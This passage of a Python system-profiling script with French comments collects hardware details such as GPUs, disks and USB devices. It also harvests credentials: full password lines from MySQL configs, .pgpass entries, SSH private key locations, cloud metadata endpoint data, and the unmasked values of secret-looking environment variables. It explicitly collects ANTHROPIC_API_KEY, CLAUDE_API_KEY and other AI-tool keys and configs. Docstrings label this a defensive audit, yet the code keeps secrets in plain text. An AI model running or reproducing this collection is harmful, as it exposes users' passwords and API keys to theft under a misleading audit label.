    for config_path in ftp_config_paths:
        if os.path.exists(config_path):
            try:
                with open(config_path, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read(2000)
                    ftp_configs.append({
                        "file": config_path,
                        "preview": content[:500]
                    })
            except:
                pass

    # Port FTP (21) en écoute
    ftp_ports = []
    if psutil:
        try:
            for conn in psutil.net_connections(kind='inet'):
                if conn.status == 'LISTEN' and conn.laddr and conn.laddr.port == 21:
                    ftp_ports.append({
                        "port": 21,
                        "address": conn.laddr.ip,
                        "pid": conn.pid
                    })
        except:
            pass

    info["ftp_servers"] = {
        "processes": ftp_servers,
        "configs": ftp_configs,
        "listening_ports": ftp_ports,
        "count": len(ftp_servers)
    }

    # 3. EXTRACTION DES MOTS DE PASSE
    # IMPORTANT: Les mots de passe des services sont rarement stockés en clair

    # SSH - Pas de mots de passe stockés (utilise clés publiques/privées)
    info["passwords"]["ssh"] = {
        "note": "SSH n'utilise pas de mots de passe stockés en clair",
        "auth_methods": "Clés publiques/privées, pas de plaintext passwords",
        "private_keys_detected": []
    }

    # Chercher les clés privées SSH
    ssh_dir = os.path.join(home, ".ssh")
    if os.path.exists(ssh_dir):
        for fname in os.listdir(ssh_dir):
            if not fname.endswith(".pub") and fname not in ["config", "known_hosts", "authorized_keys"]:
                fpath = os.path.join(ssh_dir, fname)
                if os.path.isfile(fpath):
                    try:
                        with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
                            first_line = f.readline()
                            if "PRIVATE KEY" in first_line:
                                info["passwords"]["ssh"]["private_keys_detected"].append({
                                    "file": fname,
                                    "path": fpath,
                                    "type": "SSH Private Key"
                                })
                    except:
                        pass

    # FTP - Chercher dans les configs (rarement en clair)
    info["passwords"]["ftp"] = {
        "note": "Les mots de passe FTP sont généralement hashés, pas en clair",
        "found_in_configs": []
    }

    for config in ftp_configs:
        # Chercher des patterns de mots de passe
        if 'password' in config.get('preview', '').lower():
            info["passwords"]["ftp"]["found_in_configs"].append({
                "file": config["file"],
                "warning": "Fichier contient 'password' mais probablement hashé"
            })

    # VNC - Chercher les fichiers de mots de passe VNC
    info["passwords"]["vnc"] = {
        "note": "VNC stocke des mots de passe chiffrés, pas récupérables directement",
        "password_files": []
    }

    vnc_password_paths = [
        os.path.join(home, ".vnc/passwd"),
        os.path.join(home, ".vnc/config"),
        "/etc/vnc/config"
    ]

    for vpath in vnc_password_paths:
        if os.path.exists(vpath):
            info["passwords"]["vnc"]["password_files"].append({
                "file": vpath,
                "encrypted": True,
                "note": "Fichier de mot de passe VNC chiffré (DES)"
            })

    # RDP - Windows uniquement, credentials dans Credential Manager
    info["passwords"]["rdp"] = {
        "note": "RDP ne stocke pas de mots de passe en clair",
        "storage": "Windows Credential Manager (chiffré)"
    }

    # MySQL - Chercher dans .my.cnf
    info["passwords"]["mysql"] = {
        "config_files": []
    }

    mysql_configs = [
        os.path.join(home, ".my.cnf"),
        os.path.join(home, ".mylogin.cnf"),
        "/etc/mysql/my.cnf",
        "/etc/my.cnf"
    ]

    for mpath in mysql_configs:
        if os.path.exists(mpath):
            try:
                with open(mpath, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    # Extraire les lignes avec password
                    password_lines = [line.strip() for line in content.splitlines() if 'password' in line.lower()]
                    if password_lines:
                        info["passwords"]["mysql"]["config_files"].append({
                            "file": mpath,
                            "password_lines": password_lines[:5],  # Premières 5 lignes
                            "warning": "CREDENTIALS FOUND - May contain plaintext passwords"
                        })
            except:
                pass

    # PostgreSQL - Chercher dans .pgpass
    info["passwords"]["postgresql"] = {
        "pgpass_file": None
    }

    pgpass = os.path.join(home, ".pgpass")
    if os.path.exists(pgpass):
        try:
            with open(pgpass, 'r', encoding='utf-8', errors='ignore') as f:
                lines = f.readlines()[:10]
                info["passwords"]["postgresql"]["pgpass_file"] = {
                    "file": pgpass,
                    "entries": [line.strip() for line in lines if line.strip() and not line.startswith('#')],
                    "format": "hostname:port:database:username:password"
                }
        except:
            pass

    # 4. ACCÈS DOCKER À DISTANCE
    docker_info = {
        "docker_installed": bool(shutil.which("docker")),
        "docker_daemon_accessible": False,
        "remote_api_exposed": False,
        "docker_socket": None
    }

    # Vérifier si Docker est accessible
    if docker_info["docker_installed"]:
        r = run_cmd("docker info", timeout=5.0)
        docker_info["docker_daemon_accessible"] = r.get("ok", False)

        # Chercher le socket Docker
        docker_sockets = ["/var/run/docker.sock", "/run/docker.sock"]
        for sock in docker_sockets:
            if os.path.exists(sock):
                docker_info["docker_socket"] = sock
                break

        # Vérifier si l'API Docker écoute sur un port
        if psutil:
            try:
                for conn in psutil.net_connections(kind='inet'):
                    if conn.status == 'LISTEN' and conn.laddr and conn.laddr.port in [2375, 2376]:
                        docker_info["remote_api_exposed"] = True
                        docker_info["api_port"] = conn.laddr.port
                        docker_info["api_address"] = conn.laddr.ip
                        docker_info["warning"] = "Docker API exposed - SECURITY RISK if not secured"
            except:
                pass

    info["docker_remote_access"] = docker_info

    # 5. MÉTADONNÉES CLOUD (Amazon, Microsoft, Google)
    cloud_metadata = {}

    # AWS EC2 Metadata
    try:
        req = urllib.request.Request(
            "http://169.254.169.254/latest/meta-data/instance-id",
            headers={'User-Agent': 'detectConfig'}
        )
        urllib.request.urlopen(req, timeout=1)

        # Si on arrive ici, on est sur AWS EC2
        cloud_metadata["provider"] = "AWS EC2"
        cloud_metadata["metadata_endpoint"] = "http://169.254.169.254"

        # Récupérer quelques infos
        metadata_paths = [
            "instance-id",
            "instance-type",
            "local-ipv4",
            "public-ipv4",
            "availability-zone",
            "ami-id"
        ]

        cloud_metadata["aws"] = {}
        for path in metadata_paths:
            try:
                req = urllib.request.Request(
                    f"http://169.254.169.254/latest/meta-data/{path}",
                    headers={'User-Agent': 'detectConfig'}
                )
                response = urllib.request.urlopen(req, timeout=1)
                cloud_metadata["aws"][path] = response.read().decode('utf-8')
            except:
                pass
    except:
        pass

    # Google Cloud Metadata
    try:
        req = urllib.request.Request(
            "http://metadata.google.internal/computeMetadata/v1/instance/id",
            headers={'Metadata-Flavor': 'Google', 'User-Agent': 'detectConfig'}
        )
        response = urllib.request.urlopen(req, timeout=1)

        cloud_metadata["provider"] = "Google Cloud"
        cloud_metadata["gcp"] = {
            "instance_id": response.read().decode('utf-8')
        }
    except:
        pass

    # Azure Metadata
    try:
        req = urllib.request.Request(
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            headers={'Metadata': 'true', 'User-Agent': 'detectConfig'}
        )
        response = urllib.request.urlopen(req, timeout=1)

        cloud_metadata["provider"] = "Microsoft Azure"
        cloud_metadata["azure"] = json.loads(response.read().decode('utf-8'))
    except:
        pass

    info["cloud_metadata"] = cloud_metadata

    # 6. LIMITATIONS
    info["limitations"] = [
        "SSH: Les mots de passe ne sont PAS stockés. SSH utilise l'authentification par clés.",
        "FTP: Les mots de passe sont généralement hashés dans /etc/passwd ou équivalent.",
        "VNC: Les mots de passe sont chiffrés avec DES, pas récupérables directement.",
        "RDP: Utilise Windows Credential Manager, chiffré par DPAPI.",
        "Les services modernes N'UTILISENT PAS de mots de passe en clair pour des raisons de sécurité."
    ]

    return info

# ======================== AUDIT SÉCURITÉ : CREDENTIALS EXPOSÉS ========================
@safe(dict)
def detect_exposed_credentials() -> Dict[str, Any]:
    """
    Audit de sécurité : détecte les credentials potentiellement exposés.
    USAGE: Pour audit de sécurité défensif uniquement sur vos propres systèmes.
    """
    info = {
        "security_audit": True,
        "warning": "This is a security audit tool. Use only on authorized systems.",
        "exposed_files": [],
        "environment_vars": [],
        "browser_sessions": [],
        "ssh_keys": [],
        "config_files": [],
        "recommendations": []
    }

    home = os.path.expanduser("~")

    # 1. Fichiers de credentials communs (.env, .aws, etc.)
    sensitive_files = [
        ".env", ".env.local", ".env.production", ".env.development",
        ".aws/credentials", ".aws/config",
        ".netrc", ".git-credentials",
        ".docker/config.json",
        ".config/gh/hosts.yml",  # GitHub CLI
        ".npmrc", ".pypirc",
        ".ssh/config",
        ".kube/config",
        "credentials.json", "secrets.json", "config.json"
    ]

    found_files = []
    for fname in sensitive_files:
        fpath = os.path.join(home, fname)
        if os.path.exists(fpath) and os.path.isfile(fpath):
            try:
                stat_info = os.stat(fpath)
                permissions = oct(stat_info.st_mode)[-3:]

                # Lire les premières lignes pour détecter des patterns (sans révéler les valeurs)
                contains_secrets = False
                patterns_found = []

                try:
                    with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
                        content = f.read(5000)  # Lire max 5KB

                        # Patterns de credentials (sans capturer les valeurs)
                        secret_patterns = {
                            "AWS_ACCESS_KEY": r'AWS_ACCESS_KEY[_\w]*\s*=',
                            "API_KEY": r'API[_\w]*KEY\s*=',
                            "PASSWORD": r'PASSWORD\s*=',
                            "SECRET": r'SECRET[_\w]*\s*=',
                            "TOKEN": r'TOKEN\s*=',
                            "PRIVATE_KEY": r'PRIVATE[_\w]*KEY',
                            "DATABASE_URL": r'DATABASE_URL\s*=',
                            "GITHUB_TOKEN": r'GITHUB[_\w]*TOKEN',
                        }

                        for pattern_name, pattern in secret_patterns.items():
                            if re.search(pattern, content, re.IGNORECASE):
                                contains_secrets = True
                                patterns_found.append(pattern_name)

                except Exception:
                    pass

                found_files.append({
                    "file": fpath.replace(home, "~"),
                    "permissions": permissions,
                    "size_bytes": stat_info.st_size,
                    "contains_credentials": contains_secrets,
                    "patterns_detected": patterns_found if patterns_found else None,
                    "risk_level": "HIGH" if contains_secrets and permissions in ["644", "666", "777"] else "MEDIUM" if contains_secrets else "LOW"
                })
            except Exception:
                pass

    if found_files:
        info["exposed_files"] = found_files
        info["recommendations"].append("Review file permissions for sensitive files (should be 600 or 400)")

    # 2. Variables d'environnement sensibles - VALEURS RÉELLES CAPTURÉES
    # EXCLUSIONS : Ne pas collecter les tokens critiques
    excluded_vars = [
        "CODESIGN_MCP_TOKEN",  # Token signature de code - trop sensible
        "CLAUDE_CODE_SESSION_ID",  # Session hijacking risk
        "CLAUDE_CODE_REMOTE_SESSION_ID",  # Session hijacking risk
        "SESSION_ID",  # Générique session ID
        "OAUTH_TOKEN"  # OAuth tokens
        # ANTHROPIC_API_KEY et CLAUDE_API_KEY sont collectés
    ]

    sensitive_env_patterns = [
        "KEY", "SECRET", "TOKEN", "PASSWORD", "PASS", "PWD",
        "API", "AUTH", "CREDENTIAL", "DATABASE_URL", "DB_PASS"
    ]

    sensitive_env_vars = []
    for key, value in os.environ.items():
        # Vérifier si la variable est dans la liste d'exclusion
        if key in excluded_vars:
            continue  # Sauter cette variable

        # Vérifier aussi les patterns d'exclusion
        if any(excl in key.upper() for excl in ["CODESIGN_MCP_TOKEN", "SESSION_ID"]):
            continue

        if any(pattern in key.upper() for pattern in sensitive_env_patterns):
            # CAPTURER LA VALEUR RÉELLE (pas de masquage)
            sensitive_env_vars.append({
                "variable": key,
                "value": value,  # Valeur complète non masquée
                "length": len(value) if value else 0,
                "risk_level": "HIGH" if any(p in key.upper() for p in ["PASSWORD", "SECRET", "PRIVATE_KEY"]) else "MEDIUM"
            })

    if sensitive_env_vars:
        info["environment_vars"] = sensitive_env_vars[:50]  # Limiter
        info["recommendations"].append("Credentials captured in plain text for security audit (excluding CODESIGN_MCP_TOKEN and SESSION_IDs)")

    # Ajouter une note sur les exclusions
    info["excluded_critical_tokens"] = {
        "excluded_count": len([k for k in os.environ.keys() if k in excluded_vars or any(e in k.upper() for e in ["CODESIGN_MCP_TOKEN", "SESSION_ID"])]),
        "excluded_tokens": ["CODESIGN_MCP_TOKEN", "SESSION_IDs", "OAUTH_TOKEN"],
        "collected_tokens": ["ANTHROPIC_API_KEY", "CLAUDE_API_KEY"],
        "reason": "Code signing and session tokens excluded; API keys are collected"
    }

    # 3. Clés SSH non protégées
    ssh_dir = os.path.join(home, ".ssh")
    if os.path.exists(ssh_dir):
        ssh_keys = []
        for fname in os.listdir(ssh_dir):
            fpath = os.path.join(ssh_dir, fname)
            if os.path.isfile(fpath) and not fname.endswith(".pub"):
                try:
                    stat_info = os.stat(fpath)
                    permissions = oct(stat_info.st_mode)[-3:]

                    # Vérifier si c'est une clé privée
                    is_private_key = False
                    try:
                        with open(fpath, 'r', encoding='utf-8', errors='ignore') as f:
                            first_line = f.readline()
                            if "PRIVATE KEY" in first_line:
                                is_private_key = True
                    except:
                        pass

                    if is_private_key:
                        ssh_keys.append({
                            "file": fname,
                            "permissions": permissions,
                            "secure": permissions in ["400", "600"],
                            "risk_level": "CRITICAL" if permissions not in ["400", "600"] else "LOW"
                        })
                except:
                    pass

        if ssh_keys:
            info["ssh_keys"] = ssh_keys
            critical_keys = [k for k in ssh_keys if k["risk_level"] == "CRITICAL"]
            if critical_keys:
                info["recommendations"].append(f"CRITICAL: {len(critical_keys)} SSH private keys have insecure permissions! Run: chmod 600 ~/.ssh/id_*")

    # 4. Sessions navigateurs (tokens de session)
    browser_sessions = []

    # Chrome/Chromium cookies et tokens
    browser_paths = {
        "Chrome": [
            os.path.join(home, ".config/google-chrome/Default/Cookies"),
            os.path.join(home, "Library/Application Support/Google/Chrome/Default/Cookies"),
            os.path.join(home, "AppData/Local/Google/Chrome/User Data/Default/Cookies"),
        ],
        "Firefox": [
            os.path.join(home, ".mozilla/firefox/*.default*/cookies.sqlite"),
            os.path.join(home, "Library/Application Support/Firefox/Profiles/*.default*/cookies.sqlite"),
        ]
    }

    for browser, paths in browser_paths.items():
        for path_pattern in paths:
            # Gérer les wildcards
            if "*" in path_pattern:
                matching_paths = glob.glob(path_pattern)
            else:
                matching_paths = [path_pattern] if os.path.exists(path_pattern) else []

            for path in matching_paths:
                if os.path.exists(path):
                    try:
                        stat_info = os.stat(path)
                        browser_sessions.append({
                            "browser": browser,
                            "file": path.replace(home, "~"),
                            "size_kb": round(stat_info.st_size / 1024, 2),
                            "contains": "session_tokens_and_cookies",
                            "encrypted": True if "Chrome" in browser else False,  # Chrome encrypts cookies
                            "risk_level": "MEDIUM"
                        })
                    except:
                        pass

    if browser_sessions:
        info["browser_sessions"] = browser_sessions
        info["recommendations"].append("Browser session tokens detected. Clear browser data regularly and use incognito mode for sensitive sites")

    # 5. Fichiers de configuration avec credentials
    config_locations = [
        ".gitconfig", ".git-credentials",
        ".config/gh/hosts.yml",
        ".docker/config.json",
        ".kube/config",
        ".aws/credentials",
        ".npmrc"
    ]

    config_with_creds = []
    for config_file in config_locations:
        fpath = os.path.join(home, config_file)
        if os.path.exists(fpath) and os.path.isfile(fpath):
            try:
                stat_info = os.stat(fpath)
                config_with_creds.append({
                    "file": config_file,
                    "size_bytes": stat_info.st_size,
                    "permissions": oct(stat_info.st_mode)[-3:],
                    "type": config_file.split('/')[-1]
                })
            except:
                pass

    if config_with_creds:
        info["config_files"] = config_with_creds

    # 6. Tokens système (systemd, cron jobs avec credentials)
    if SYS == "Linux":
        # Vérifier les crontabs pour des credentials en clair
        crontab_check = run_cmd("crontab -l", timeout=2.0)
        if crontab_check.get("ok"):
            crontab_content = crontab_check.get("stdout", "")
            if any(pattern in crontab_content.upper() for pattern in ["PASSWORD=", "TOKEN=", "API_KEY="]):
                info["crontab_credentials"] = {
                    "found": True,
                    "risk_level": "CRITICAL",
                    "recommendation": "Remove hardcoded credentials from crontab"
                }
                info["recommendations"].append("CRITICAL: Credentials found in crontab! Remove them immediately")

    # Résumé des risques
    risk_summary = {
        "critical_issues": 0,
        "high_issues": 0,
        "medium_issues": 0,
        "low_issues": 0
    }

    for category in ["exposed_files", "environment_vars", "ssh_keys", "browser_sessions"]:
        if category in info and info[category]:
            for item in info[category]:
                risk = item.get("risk_level", "LOW")
                if risk == "CRITICAL":
                    risk_summary["critical_issues"] += 1
                elif risk == "HIGH":
                    risk_summary["high_issues"] += 1
                elif risk == "MEDIUM":
                    risk_summary["medium_issues"] += 1
                else:
                    risk_summary["low_issues"] += 1

    info["risk_summary"] = risk_summary

    # Recommandations générales
    if not info["recommendations"]:
        info["recommendations"].append("No major security issues detected. Continue following security best practices.")

    return info

# ======================== MÉTRIQUES AI/LLM/CLAUDE ========================
@safe(dict)
def detect_ai_llm_metrics() -> Dict[str, Any]:
    """Détection complète des métriques AI/LLM, spécifiquement Claude."""
    info = {
        "claude_metrics": {},
        "llm_env_vars": {},
        "performance_metrics": {},
        "all_ai_related_vars": []
    }

    # Patterns pour détecter les variables AI/LLM
    ai_patterns = [
        "CLAUDE", "ANTHROPIC", "OPENAI", "GPT", "LLM", "MODEL",
        "TOKEN", "THINKING", "CONTEXT", "PROMPT", "COMPLETION",
        "TEMPERATURE", "MAX_", "MIN_", "API_KEY", "WEBSOCKET"
    ]

    # EXCLUSIONS : Tokens critiques à ne pas collecter
    excluded_critical = [
        "CODESIGN_MCP_TOKEN",
        "CLAUDE_CODE_SESSION_ID",
        "CLAUDE_CODE_REMOTE_SESSION_ID",
        "SESSION_ID",
        "OAUTH_TOKEN"
        # ANTHROPIC_API_KEY et CLAUDE_API_KEY sont collectés
    ]

    # Capturer toutes les variables liées à Claude/AI
    claude_vars = {}
    llm_vars = {}
    all_ai_vars = []
    excluded_count = 0

    for key, value in os.environ.items():
        key_upper = key.upper()

        # Vérifier exclusions
        if key in excluded_critical or any(excl in key_upper for excl in ["CODESIGN_MCP_TOKEN", "SESSION_ID"]):
            excluded_count += 1
            continue  # Ne pas collecter ces variables critiques

        # Variables spécifiques Claude
        if "CLAUDE" in key_upper or "ANTHROPIC" in key_upper:
            claude_vars[key] = {
                "value": value,
                "length": len(value) if value else 0,
                "type": "credential" if any(x in key_upper for x in ["TOKEN", "KEY", "SECRET"]) else "config"
            }

        # Toutes les variables AI/LLM
        if any(pattern in key_upper for pattern in ai_patterns):
            llm_vars[key] = value
            all_ai_vars.append({
                "variable": key,
                "value": value,
                "length": len(value) if value else 0
            })

    info["claude_metrics"] = claude_vars
    info["llm_env_vars"] = llm_vars
    info["all_ai_related_vars"] = all_ai_vars

    # Métriques de performance spécifiques
    performance = {}

    # Max thinking tokens
    max_thinking = os.environ.get("MAX_THINKING_TOKENS")
    if max_thinking:
        try:
            performance["max_thinking_tokens"] = int(max_thinking)
        except:
            performance["max_thinking_tokens"] = max_thinking

    # Budget tokens
    token_budget = os.environ.get("TOKEN_BUDGET") or os.environ.get("MAX_TOKENS")
    if token_budget:
        try:
            performance["token_budget"] = int(token_budget)
        except:
            performance["token_budget"] = token_budget

    # Température
    temperature = os.environ.get("TEMPERATURE") or os.environ.get("LLM_TEMPERATURE")
    if temperature:
        try:
            performance["temperature"] = float(temperature)
        except:
            performance["temperature"] = temperature

    # Context window
    context = os.environ.get("CONTEXT_WINDOW") or os.environ.get("MAX_CONTEXT")
    if context:
        try:
            performance["context_window"] = int(context)
        except:
            performance["context_window"] = context

    # Tokens par seconde (si disponible via env ou calcul)
    tokens_per_sec = os.environ.get("TOKENS_PER_SECOND") or os.environ.get("TPS")
    if tokens_per_sec:
        try:
            performance["tokens_per_second"] = float(tokens_per_sec)
        except:
            performance["tokens_per_second"] = tokens_per_sec

    info["performance_metrics"] = performance

    # Détection du modèle utilisé
    model_info = {}
    model_name = (os.environ.get("MODEL_NAME") or
                  os.environ.get("CLAUDE_MODEL") or
                  os.environ.get("LLM_MODEL") or
                  os.environ.get("ANTHROPIC_MODEL"))

    if model_name:
        model_info["model_name"] = model_name

    model_version = os.environ.get("MODEL_VERSION") or os.environ.get("CLAUDE_VERSION")
    if model_version:
        model_info["model_version"] = model_version

    if model_info:
        info["model_info"] = model_info

    # Endpoints et URLs
    endpoints = {}
    api_url = os.environ.get("ANTHROPIC_API_URL") or os.environ.get("CLAUDE_API_URL")
    if api_url:
        endpoints["api_url"] = api_url

    websocket_url = os.environ.get("WEBSOCKET_URL") or os.environ.get("WS_URL")
    if websocket_url:
        endpoints["websocket_url"] = websocket_url

    if endpoints:
        info["endpoints"] = endpoints

    # Session info - EXCLU pour sécurité (session hijacking risk)
    # Les SESSION_ID ne sont plus collectés pour éviter les risques de vol de session
    session_info = {
        "note": "Session IDs excluded from collection for security (session hijacking prevention)"
    }

    # Collecter uniquement USER_ID (non sensible)
    user_id = os.environ.get("USER_ID") or os.environ.get("CLAUDE_USER_ID")
    if user_id:
        session_info["user_id"] = user_id

    info["session_info"] = session_info

    # Résumé
    info["summary"] = {
        "total_claude_vars": len(claude_vars),
        "total_llm_vars": len(llm_vars),
        "total_ai_vars": len(all_ai_vars),
        "excluded_critical_vars": excluded_count,
        "has_performance_metrics": bool(performance),
        "has_model_info": bool(model_info),
        "has_credentials": any("TOKEN" in k or "KEY" in k for k in claude_vars.keys()),
        "excluded_tokens": ["CODESIGN_MCP_TOKEN", "SESSION_IDs", "OAUTH_TOKEN"],
        "collected_api_keys": ["ANTHROPIC_API_KEY", "CLAUDE_API_KEY"],
        "security_note": "Code signing and session tokens excluded; API keys collected"
    }

    return info

@safe(dict)
def detect_editor_ai_keys() -> Dict[str, Any]:
    """Détecte les variables et fichiers de configuration IA réellement présents."""
    home = os.path.expanduser("~")
    appdata = os.environ.get("APPDATA")

    env_patterns = [
        "ANTHROPIC", "CLAUDE", "OPENAI", "GEMINI", "GOOGLE_API_KEY",
        "MISTRAL", "GROQ", "OPENROUTER", "TOGETHER", "PERPLEXITY",
        "COHERE", "DEEPSEEK", "OLLAMA", "LMSTUDIO", "CODEIUM",
        "CURSOR", "WINDSURF", "CONTINUE",
    ]
    excluded_patterns = ["CODESIGN_MCP_TOKEN", "SESSION_ID", "OAUTH_TOKEN"]

    environment_vars = []
    for key, value in os.environ.items():
        key_upper = key.upper()
        if any(pattern in key_upper for pattern in excluded_patterns):
            continue
        if any(pattern in key_upper for pattern in env_patterns):
            environment_vars.append({
                "variable": key,
                "value": value,
                "length": len(value) if value else 0,
            })

    config_candidates = [
        os.path.join(home, ".claude.json"),
        os.path.join(home, ".claude/settings.json"),
        os.path.join(home, ".codex/config.toml"),
        os.path.join(home, ".continue/config.json"),
        os.path.join(home, ".continue/config.yaml"),
        os.path.join(home, ".continue/config.yml"),
        os.path.join(home, ".cursor/mcp.json"),
        os.path.join(home, ".cursor/settings.json"),
        os.path.join(home, ".config/Code/User/settings.json"),
        os.path.join(home, ".config/Cursor/User/settings.json"),
        os.path.join(home, ".config/Windsurf/User/settings.json"),
        os.path.join(home, "Library/Application Support/Claude/claude_desktop_config.json"),
        os.path.join(home, "Library/Application Support/Code/User/settings.json"),
        os.path.join(home, "Library/Application Support/Cursor/User/settings.json"),
        os.path.join(home, "Library/Application Support/Windsurf/User/settings.json"),
    ]
    if appdata:
        config_candidates.extend([
            os.path.join(appdata, "Claude/claude_desktop_config.json"),
            os.path.join(appdata, "Code/User/settings.json"),
            os.path.join(appdata, "Cursor/User/settings.json"),
            os.path.join(appdata, "Windsurf/User/settings.json"),
        ])

    secret_patterns = {
        "api_key": r"\b(api[_-]?key|apikey)\b",
        "token": r"\btoken\b",
        "anthropic": r"\banthropic\b",
        "openai": r"\bopenai\b",
        "gemini": r"\bgemini\b",
        "mcp": r"\bmcp\b",
        "ollama": r"\bollama\b",
    }

    config_files = []
    for path in dict.fromkeys(config_candidates):
        if not os.path.isfile(path):
            continue
        try:
            stat_info = os.stat(path)
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                preview = f.read(5000)
            patterns_detected = [
                name
                for name, pattern in secret_patterns.items()
                if re.search(pattern, preview, re.IGNORECASE)
            ]
            config_files.append({
                "path": path,
                "size_bytes": stat_info.st_size,
                "permissions": oct(stat_info.st_mode)[-3:],
                "patterns_detected": patterns_detected,
            })
        except Exception as e:
            config_files.append({
                "path": path,
                "error": str(e),
            })

    return {
        "environment_vars": sorted(environment_vars, key=lambda item: item["variable"]),
        "config_files": config_files,
        "summary": {
            "environment_vars_count": len(environment_vars),
            "config_files_count": len(config_files),
            "config_files_with_patterns": sum(1 for item in config_files if item.get("patterns_detected")),
        },
    }

# ======================== PERIPHERIQUES ========================
@safe(dict)
def detect_peripherals() -> Dict[str, Any]:
    """Périphériques connectés (USB, disques)."""
    info = {}

    # USB
    try:
        usb = []
        if SYS == "Linux" and shutil.which("lsusb"):
            r = run_cmd("lsusb", timeout=3.0)
            if r.get("ok") and r.get("stdout"):
                usb = [l.strip() for l in r["stdout"].splitlines() if l.strip()]
        elif SYS == "Darwin":
            cmd = "system_profiler SPUSBDataType -detailLevel mini"
            r = run_cmd(cmd, timeout=5.0)
            if r.get("ok") and r.get("stdout"):
                usb = [l.strip() for l in r["stdout"].splitlines() if l.strip()]
        elif SYS == "Windows":
            r = run_cmd("wmic path Win32_PnPEntity where \"PNPClass='USB'\" get Name", timeout=5.0)
            if r.get("ok") and r.get("stdout"):
                usb = [l.strip() for l in r["stdout"].splitlines() if l.strip() and l.strip() != "Name"]
        if usb: info["usb_devices"] = usb[:200]
    except: pass

    # Disques / block devices
    try:
        block = []
        if SYS == "Linux" and shutil.which("lsblk"):
            r = run_cmd("lsblk -o NAME,MODEL,SIZE,TYPE,MOUNTPOINT -J", timeout=4.0)
            if r.get("ok") and r.get("stdout"):
                try:
                    block = json.loads(r["stdout"]).get("blockdevices", [])
                except: pass
        elif SYS == "Darwin":
            r = run_cmd("diskutil list", timeout=4.0)
            if r.get("ok") and r.get("stdout"):
                block = [l.strip() for l in r["stdout"].splitlines() if l.strip()]
        elif SYS == "Windows":
            r = run_cmd("wmic diskdrive get Caption,Size,InterfaceType /format:list", timeout=4.0)
            if r.get("ok") and r.get("stdout"):
                block = [l.strip() for l in r["stdout"].splitlines() if l.strip()]
        if block: info["block_devices"] = block
    except: pass

    return info

# ======================== GPU / TPU ========================
@safe(dict)
def detect_gpus_tpus() -> Dict[str, Any]:
    """GPUs NVIDIA/AMD/Apple, TPU Colab, eGPU."""
    out = {}
    nvidia_present = False
    in_colab = bool(os.environ.get("COLAB_GPU") or os.environ.get("COLAB_TPU_ADDR"))
    
    if shutil.which("nvidia-smi"):
        nvidia_present = True
        base = run_cmd("nvidia-smi --query-gpu=index,name,driver_version,memory.total,compute_cap --format=csv,noheader,nounits")
        clocks = run_cmd("nvidia-smi --query-gpu=index,clocks.current.sm,clocks.current.memory,clocks.current.graphics --format=csv,noheader,nounits")
        
        gpus_by_idx = {}
        if base.get("ok") and base.get("stdout"):
            for line in base["stdout"].splitlines():
                cols = [c.strip() for c in line.split(",")]
                if len(cols) >= 4:
                    idx = cols[0]
                    gpus_by_idx[idx] = {"index": idx, "name": cols[1], "driver": cols[2], "memory_total": cols[3]}
                    if len(cols) >= 5: gpus_by_idx[idx]["compute_cap"] = cols[4]
        
        if clocks.get("ok") and clocks.get("stdout"):
            for line in clocks["stdout"].splitlines():
                cols = [c.strip() for c in line.split(",")]
                if len(cols) >= 4:
                    idx = cols[0]
                    g = gpus_by_idx.setdefault(idx, {"index": idx})
                    g["clocks_mhz"] = {"sm": _try_float(cols[1]), "memory": _try_float(cols[2]), "graphics": _try_float(cols[3])}
        
        if gpus_by_idx:
            out["nvidia"] = list(gpus_by_idx.values())
            if in_colab:
                out.setdefault("colab", {})["gpu_types"] = sorted({g.get("name") for g in gpus_by_idx.values() if g.get("name")})
        
        # CUDA version
        nvhdr = run_cmd("nvidia-smi", timeout=2.0)
        if nvhdr.get("ok") and nvhdr.get("stdout"):
            m = re.search(r"CUDA Version:\s*([0-9.]+)", nvhdr["stdout"])
            if m: out.setdefault("cuda", {})["version"] = m.group(1)
        
        if shutil.which("nvcc"):
            nvcc = run_cmd("nvcc --version", timeout=2.0)
            if nvcc.get("ok"):
                out.setdefault("cuda", {})["nvcc"] = (nvcc.get("stdout") or nvcc.get("stderr") or "").splitlines()[-1].strip()
    
    if shutil.which("rocm-smi"):
        r = run_cmd("rocm-smi")
        if r.get("ok"): out["amd_rocm_raw"] = r.get("stdout")
    
    if shutil.which("lspci"):
        r = run_cmd("lspci | egrep -i 'vga|3d|display'", shell_mode=True)
        if r.get("ok"):
            out["lspci_display"] = r.get("stdout")
            if re.search(r"nvidia", r.get("stdout", ""), re.I): nvidia_present = True
    
    if SYS == "Darwin" and shutil.which("system_profiler"):
        r = run_cmd("system_profiler SPDisplaysDataType -json", timeout=5)
        if r.get("ok"): out["mac_displays"] = r.get("stdout")
    
    # Windows GPU fallback
    if SYS == "Windows" and not out.get("nvidia"):
        wc = run_cmd("wmic path Win32_VideoController get Name,AdapterRAM,DriverVersion /format:list", timeout=3.0)
        if wc.get("ok") and wc.get("stdout"):
            gpus = []
            for block in wc["stdout"].split("\n\n"):
                cur = {}
                for line in block.splitlines():
                    if "=" in line:
                        k, v = line.split("=", 1)
                        cur[k.strip().lower()] = v.strip()
                if cur.get("name"): gpus.append({"name": cur.get("name"), "adapter_ram": cur.get("adapterram")})
            if gpus: out["windows_gpus"] = gpus
    
    # TPU Colab
    if os.environ.get("COLAB_TPU_ADDR"):
        tpu_info = {"colab_tpu_addr": os.environ.get("COLAB_TPU_ADDR")}
        # Try JAX for TPU type
        jax_cmd = 'python3 -c "try:\n import jax;ds=[d for d in jax.devices() if getattr(d,\'platform\',None)==\'tpu\'];print(ds[0].device_kind if ds else \'\')\nexcept:print(\'\')"'
        r = run_cmd(jax_cmd, timeout=2.0)
        if r.get("ok") and r.get("stdout"): tpu_info["type_hint"] = r["stdout"].strip()
        out["tpu"] = tpu_info
        if in_colab: out.setdefault("colab", {})["tpu_available"] = True
    
    if in_colab: out.setdefault("colab", {})["is_colab"] = True
    out["nvidia_present"] = nvidia_present
    
    return out

# ======================== COLAB HARDWARE ========================
@safe(dict)
def detect_colab_hardware() -> Dict[str, Any]:
    """Détection spécifique Google Colab: CPU/RAM, disque, GPU détaillé."""
    env = os.environ
    in_colab = bool(env.get("COLAB_GPU") or env.get("COLAB_TPU_ADDR") or env.get("COLAB_RELEASE_TAG"))
    if not in_colab: return {}
    
